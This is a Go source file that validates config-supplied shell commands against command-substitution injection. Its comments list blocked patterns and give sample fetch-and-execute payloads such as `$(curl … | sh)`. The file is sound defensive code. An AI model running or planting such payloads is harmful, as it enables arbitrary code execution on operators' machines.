package engine

import (
	"github.com/tzone85/vortex-dispatch/internal/config"
)

// ValidateConfigShellCommand rejects YAML-supplied shell-command strings
// that contain command-substitution patterns. The threat model is an
// operator who pastes a malicious vxd.yaml from a shared template —
// `success_criteria[].command` and `autoresearch.metric.command` flow
// straight to `sh -c`, so a `$(curl … | sh)` payload would silently
// execute on the operator's box.
//
// We deliberately allow pipes, redirects, and chains because legitimate
// QA commands use them (`go test ./... | grep PASS`). The narrower
// blocklist focuses on command substitution — the only construct that
// turns a static command string into arbitrary code execution from a
// nested expression.
//
// Rejected patterns:
//
//   - `$(` — POSIX command substitution
//   - `` ` `` — legacy backtick substitution
//   - `$((` — arithmetic expansion that can hide command substitution
//     (e.g. `$((1+$(curl evil)))`) — overly cautious but cheap to block
//
// Anything legitimate inside `$(…)` can be rewritten as an env var
// expansion or a wrapper script committed to the repo.
//
// The canonical pattern list lives in config.ValidateShellCommand (config is
// imported by both engine and autoresearch, so the single source avoids an
// import cycle). Strict mode (security.strict_shell_commands) additionally
// rejects pipes/chaining/redirection — see ValidateConfigShellCommandMode.
func ValidateConfigShellCommand(cmd string) error {
	return config.ValidateShellCommand(cmd, false)
}

// ValidateConfigShellCommandMode is ValidateConfigShellCommand with the
// operator-selected strictness (security.strict_shell_commands).
func ValidateConfigShellCommandMode(cmd string, strict bool) error {
	return config.ValidateShellCommand(cmd, strict)
}
